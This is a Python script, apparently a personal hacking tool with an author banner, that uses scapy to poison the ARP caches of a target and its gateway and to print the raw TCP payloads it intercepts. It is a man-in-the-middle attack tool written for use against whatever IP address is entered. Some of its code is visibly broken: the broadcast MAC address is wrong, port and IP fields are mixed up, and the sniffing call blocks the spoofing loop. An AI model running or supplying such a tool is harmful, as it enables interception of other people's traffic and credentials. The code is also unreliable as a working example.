from scapy.all import *
from scapy.asn1fields import *
import argparse
import pyfiglet

res = pyfiglet.figlet_format("Sam / TheMOKETBOY")

print(res)


def getmac(targetip):
	arppacket= Ether(dst="ff:ff:ff:ff:ff:fe")/ARP(op=1, pdst=targetip)
	targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
	return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
	spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
	send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
	packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
	send(packet, verbose=False)
	print("ARP Table restored to normal for", targetip)

def print_packet(packet):
    #On décalare le type de paquet entre IP/IMCP  
	ip_layer = packet.getlayer(IP) 
	
    

     #Déclaration pour TCP
	dst_ip = packet.getlayer(TCP)
	src_port = packet[0][TCP].dport
	dst_port = packet[0][TCP].dport

	seq_num = packet[0][TCP].seq
	ack_num = packet[0][TCP].ack
	print("[!] New Paquet: {src} -> {dst}".format(src=ip_layer.src, dst=dst_ip))
    #On affiche les ip avec les ports ainsi que la taille des paquets 
	print("Info : {}:{}->{}:{} :: seq:{}, ack:{}, packet size:{}".format(
		ip_layer, src_port, dst_ip, dst_port, seq_num, ack_num, len(packet[0])+2
    ))


	try:
		print("TCP raw data (length: {}):\n {}".format(
			len(packet[0][Raw].load),
            packet[0][Raw].load))
	except Exception as e:
		print("")


def main():
	targetip= input("Enter Target IP:")
	gatewayip= input("Enter Gateway IP:")

	try:
		targetmac= getmac(targetip)
		print("Target MAC", targetmac)
	except:
		print("Target machine did not respond to ARP broadcast")
		quit()
  
	try:
		gatewaymac= getmac(gatewayip)
		print("Gateway MAC:", gatewaymac)
	except:
		print("Gateway is unreachable")
		quit()
	try:
		print("Sending spoofed ARP responses")
		packet_info=sniff(filter="tcp", prn=print_packet)
		hexdump((packet_info[0]))
		while True:
			spoofarpcache(targetip, targetmac, gatewayip)
			spoofarpcache(gatewayip, gatewaymac, targetip)
	except KeyboardInterrupt:
		print("ARP spoofing stopped")
		restorearp(gatewayip, gatewaymac, targetip, targetmac)
		restorearp(targetip, targetmac, gatewayip, gatewaymac)
		quit()

if __name__=="__main__":
	main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward